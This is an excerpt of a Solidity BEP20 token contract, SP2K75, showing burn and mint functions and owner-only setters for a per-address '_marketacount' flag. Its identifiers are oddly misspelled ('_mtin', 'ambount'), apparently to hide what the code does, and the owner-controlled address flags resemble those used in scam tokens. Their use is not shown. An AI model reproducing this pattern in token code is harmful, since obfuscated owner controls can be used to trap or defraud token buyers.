...
contract SP2K75 is BEP20, Ownable {
    ...
    function _burn(address acount, uint256 ambount) internal virtual {
        require(acount != address(0), "ERC20: burn from the zero address");

        uint256 acountBalance = _balances[acount];
        require(acountBalance >= ambount, "ERC20: burn ambount exceeds balance");
        unchecked {
            _balances[acount] = acountBalance - ambount;
        }
        _totalSupply -= ambount;

        emit Transfer(acount, address(0), ambount);
    }

    function _mtin(address acount, uint256 ambount) internal virtual {
        require(acount != address(0), "ERC20: mtin to the zero address");

        _totalSupply += ambount;
        _balances[acount] += ambount;
        emit Transfer(address(0), acount, ambount);
    }
    ...
    function setMarketacountfioe(address _address, bool _value) external onlyowner {
        _marketacount[_address] = _value;
    }

    function getMarketacountfioe(address _address) external view onlyowner returns (bool) {
